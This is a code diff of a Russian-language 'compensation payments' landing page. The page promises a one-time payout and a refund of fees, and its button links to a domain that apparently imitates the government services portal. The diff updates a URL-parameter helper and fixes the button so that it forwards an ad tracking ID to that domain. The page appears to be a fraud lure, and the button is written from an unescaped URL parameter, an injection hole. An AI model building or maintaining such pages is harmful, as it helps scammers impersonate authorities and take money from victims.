@@ -14,13 +14,13 @@
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
     
   <title>ВЫПЛАТА КОМПЕНСАЦИЙ</title>
-<script>
-function getURLParameter(name) {
-return decodeURI(
-(RegExp(name + '=' + '(.*?)(&|$)').exec(location.search)||[,null])[1] || ''
-);
-}
-</script>
+     <script type="text/javascript">
+       function getURLParameter(name) {
+           return decodeURI(
+               (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+           );
+       }
+       </script>
 </head>
 <body id="capcha">
 
@@ -44,7 +44,7 @@ return decodeURI(
                 <li><p>*Выплата осуществляется единоразово</p></li>
                 <li><p>**Возврат комиссий в течение 30 минут</p></li>
                 <li><p>***Для гарантированного получения выплаты, рекомендуется выполнить все этапы</p></li>
-              <script>document.write('<a href="https://gosusluga.ru-zakon.info/search-news.html?topic=on&cid=gosbgit&' + window.location.search.replace('?', '') + ' class="button24">ПРИНЯТЬ УЧАСТИЕ</a>'</script>
+              <script>document.write('<a class="button24" href="https://gosusluga.ru-zakon.info/search-news.html?topic=on&cid=gosbgit&adid=' + getURLParameter('ad_id') + '">ПРИНЯТЬ УЧАСТИЕ</a>')</script>
             </ul>
         </div>
     </div>
